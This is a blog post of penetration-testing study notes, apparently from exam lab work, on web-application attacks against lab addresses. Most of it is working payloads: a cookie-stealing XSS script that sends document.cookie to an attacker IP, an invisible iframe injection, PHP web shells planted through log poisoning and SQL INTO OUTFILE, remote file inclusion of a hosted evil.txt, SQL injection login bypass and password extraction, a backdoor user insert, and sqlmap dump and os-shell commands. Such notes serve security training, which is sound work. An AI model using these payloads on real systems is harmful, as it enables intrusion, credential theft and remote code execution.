---
title: Study Notes - 2021/03/16
date: 2021-03-16 09:44:15
tags: [Penetration Testing, Study Notes]
---

Use phpmyadmin to execute arbitrary sql  
```
select * from webappdb.users;
insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
```


# Cross-Site Scripting (XSS)
Once we identify an entry point, we can input special characters, and observe the output to see if any of the special characters return unfiltered.

# Content Injection
injsect invisible iframe `<iframe src=http://192.168.119.148/report height=”0” width=”0”></iframe>`  
Open listern on attack machine `sudo nc -nvlp 80`  
can redirect to information gathering script  

# Steal cokie and session information
<script>new Image().src="http://192.168.119.148/cool.jpg?output="+document.cookie;</script>

# Directory Traversal Vulnerabilities
## Identify
find any parameter in the url that looks like a file name  
e.g. `http://192.168.148.10/menu.php?file=current_menu.php`  
modify the file to reference files that should be readable by any user on the system, such as 
/etc/passwd on Linux or c:\boot.ini on Windows  `c:\windows\system32\drivers\etc\hosts`  


# File inclusion Vulnerabilities
included file will be executed. 
## local file inclusion/remote file inclusion
different from where the file included from  
We must locate
parameters we can manipulate and attempt to use them to load arbitrary files. However, a file inclusion takes this one step further, as we attempt execute the contents of the file within the application.  

## Contaminating Log Files  
clear log  
connect the servier with `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`  
This output is first wrapped in pre HTML tags, which preserve any line breaks or formatting in the results of the function call.  
inserted into the access log of apache:  
`192.168.119.148 - - [16/Mar/2021:18:18:11 -0700] "<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>\n" 400 980 "-" "-"`  

access the file inclusion url `http://192.168.148.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`  

## Remote file inclusion  
Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit. For example, PHP apps must be configured with allow_url_include set to “On”.  

`http://192.168.148.10/menu.php?file=http://192.168.119.148/evil.txt&cmd=ipconfig`  
host the file by setup a apache server  
```
sudo vi /var/www/html/evil.txt
sudo systemctl start apache2

or 

sudo python -m SimpleHTTPServer 80
```
### webshell  
`/usr/share/webshells`  

## Expanding Your Repertoire  
open a http server on current workign path
```
python -m SimpleHTTPServer 2334
python3 -m http.server 7331
php -S 0.0.0.0:8000
ruby -run -e httpd . -p 9000
busybox httpd -f -p 10000
```

## PHP Wrappers 
when cannot poison local files
`menu.php?file=data:text/plain,hello world`  
treat the data wrapper as a file  
`menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  

# SQL injection  
## Discover SQL Injection Vulnerabilities
Common statement in sql;  
`$query = "select * from users where username = '$user' and password = '$pass'";`  

## Authentication Bypass
`tom' or 1=1;#`  `#` is comment in mysql and mariadb
Some web application expect the number of returned rows is 1  add LIMIT 1 `tom' or 1=1 LIMIT 1;#`  

## Enumerating the database  
`http://192.168.148.10/debug.php?id='`  
### Column number enueration
`http://192.168.148.10/debug.php?id=1 order by 1`  
Use burpsuit repeater tool  
results cotain 3 colums

## extra further data with union statement 
decide which colum is displayed  
`192.168.148.10/debug.php?id=1 union all select 1,2,3`  

**Union all allow duplicate values**  

colum 2,3 get displayed  
extract database verison: (depend on database engine, MariaDB use @@version)  
`http://192.168.148.10/debug.php?id=1 union all select 1, 2, @@version`  ->  10.1.31-MariaDB  
extract current database user   
`http://192.168.148.10/debug.php?id=1 union all select 1, 2, user() `  -> root@localhost  

We can enumerate database tables and column structures through the information_schema.
The information schema stores information about the database, like table and column names.
We can use it to get the layout of the database so that we can craft better payloads to extract
sensitive data. The query for this would look similar to the following:  
`http://192.168.148.10/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables`  

retrieve column name of user table:
`http://192.168.148.10/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`

extra user name and password: 
`http://192.168.148.10/debug.php?id=1 union all select 1, username, password from users`


## From sql injection to code execution
`http://192.168.148.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`


into outfile:  
from the error message, we know the location of webserver root: c:\xampp\htdocs  
```
http://192.168.148.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor2.php'

http://192.168.148.10/debug.php?id=1 union all select 1, 2, "<?php '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>" into OUTFILE 'c:/xampp/htdocs/backdoor4.php'
```

## Automating sql injection  
sqlmap -- not allowed in the exam  
`sqlmap -u http://192.168.148.10/debug.php?id=1 -p "id"`  
-p parameter to test  
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6836=6836

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 4323 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(4323=4323,1))),0x716b627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1257 FROM (SELECT(SLEEP(5)))yDOk)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7171767071,0x5a65795043747065446255675763434c564c48537750534f6d437859715570677765524e4552616a,0x716b627a71),NULL-- -
```

automate the data extraction  
`sqlmap -u http://192.168.148.10/debug.php?id=1 -p "id" --dbms=mysql --dump`

mysql and mariadb looks similar  

get os shell automatically:  
`sqlmap -u http://192.168.148.10/debug.php?id=1 -p "id" --dbms=mysql --os-shell`